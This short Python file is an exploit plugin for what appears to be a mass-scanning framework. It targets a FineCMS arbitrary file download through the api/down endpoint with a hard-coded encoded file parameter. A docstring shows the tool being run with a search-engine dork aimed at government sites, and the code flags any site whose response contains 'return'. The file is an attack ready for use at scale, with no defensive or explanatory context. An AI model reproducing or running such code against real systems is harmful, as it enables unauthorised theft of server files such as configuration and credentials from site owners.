# coding: utf-8

'''
C:\Users\Administrator\Desktop\srcscan\Shell-Frameworkd>python framework.py -k "
inurl:gov/index.php?c=content&a=list&catid=" -p 30 -e baidu -l finecms_down_0 -o
 finecms_down.txt
'''




import requests
import re

class Exploit:

    payload = "/index.php?c=api&a=down&file=NDgwNTA0M2RFRXRkc1ZTaGNuczJBSjZTSk9KSDVTYnFqL251K0lNRjBQK0tla0FBTVpHM3dLbU8yVTNWaE1SYTRtRXRjUlQ3bDd4cGRQeVRKMGVlcDEvQjNRVlA4bTNnMi9SZDRDSjBOUQ"
    comp = r'return'

    def attack(self, url):
        response = requests.get(url+self.payload)
        if re.search(self.comp, response.content):
            return url+self.payload